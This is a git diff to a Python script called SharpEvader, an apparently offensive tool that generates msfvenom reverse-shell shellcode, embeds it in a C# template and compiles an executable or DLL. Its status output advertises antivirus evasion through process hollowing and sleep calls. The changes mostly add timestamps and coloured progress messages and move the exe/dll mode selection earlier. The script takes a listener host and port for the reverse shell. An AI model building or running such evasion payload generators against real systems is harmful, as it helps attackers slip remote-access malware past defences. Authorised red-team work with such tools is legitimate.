@@ -1,9 +1,12 @@
 import os
 import yaml
+import time
+import datetime
 import logging
 import subprocess
 
 
+from helpers.colorize import *
 from helpers.log import logger
 from helpers.args import generate_cli_args
 from helpers.generate_csharp_payload import generate_csharp_payload
@@ -40,6 +43,7 @@ def read_and_convert_shellcode():
 
 # Compiling the csharp code and placing it in the current working directory
 def compile_csharp_code(mode="exe",nobin=False):
+    global cwd
     logger.debug("Attempting to compile the C# File wth mono-mcs")
     if nobin:
         logger.debug("nobin flag found, The generated rev.exe or rev.dll would be placed in /tmp/sharpevader_tmp/ ")
@@ -80,11 +84,24 @@ def main():
     global args
     args = generate_cli_args()
     logger.setLevel(logging.ERROR)
-    # Arguments check
+
+    # Checking if the program is run in verbose mode
     if args.v:
         logger.setLevel(logging.DEBUG)
+        logger.debug(f"Arguments : {args}")
+    # Printing the Datetime when the command is run
+    current_time = datetime.datetime.fromtimestamp(time.time()).strftime("%d/%m/%Y %I:%M:%S %p")
+    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]{end}  Starting Payload Generation Process @ {bold}{teal}{current_time}{end}",level=logger.level)
+    # Setting the File Formats
+    if args.dll:
+        mode = "dll"
+    else:
+        mode = "exe"
+    extenstions = f"{mode}" if args.nops1 else f"{mode},ps1"
+    reflection = False if args.nops1 else True
+    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]{end}  Signature Bypass : {teal}{bold}Process Hollowing{end}\tHeuristic Bypass : {teal}{bold}Sleep Calls{end}",level=logger.level)
 
-
+    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]{end}  Format : {teal}{bold}{extenstions}{end}\t\t\t\tPowershell Reflection : {teal}{bold}{reflection}{end}",level=logger.level)
     # Generating the msfvenom payload and placing it in the /tmp/sharpevader_tmp/msf_shellcode.hex
     generate_msfvenom_payload()
 
@@ -111,14 +128,9 @@ def main():
         final_csharp_code = "".join(final_csharp_template)
         f.write(final_csharp_code)
     
-    if args.dll:
-        mode = "dll"
-    else:
-        mode = "exe"
-    
     # Compiling the csharp code
     compile_csharp_code(mode=mode,nobin=args.nobin)
-
+    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{green}{bold}\t\t[+]{end}  Payload generated : {bold}{teal}{cwd}/rev.{mode}{end}",level=logger.level)
     # Cleaning up the /tmp directory
     cleanup()
 
